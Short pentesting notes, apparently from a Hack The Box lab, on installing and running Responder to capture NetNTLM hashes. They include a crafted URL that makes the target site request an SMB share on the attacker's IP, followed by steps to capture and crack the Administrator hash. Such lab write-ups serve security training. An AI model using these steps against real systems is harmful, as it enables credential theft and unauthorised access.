```
sudo apt install responder
```

```
git pull https://github.com/lgandx/Responder
```

### Exploit [[NTLM]]
- [HTB writeup](blob:https://app.hackthebox.com/e9cd6721-9743-4a7f-afd2-f00e33eb8e50)
- Check Responder.conf is set to listen for SMB requests
	- responder.conf (In `/etc/responder` using linux tool not python)

- May need to turn off HTTP server in .conf if being used by another service
- Start responder
	- Choose interface to use:
```
-I tun0
sudo responder -I {network_interface}
```
- Should prompt listening for events
- Get website to make request to SMB hosted server (our IP)
	- e.g `http://unika.htb/?page=//10.10.14.25/somefile`
	- Should get error on webpage
	- Responder should display NetNTLMv for the Administrator or displayed user
- Dump the hash and try to crack


### Other Stuff
- Choose IP:
```
-i 192.168.1.202
```
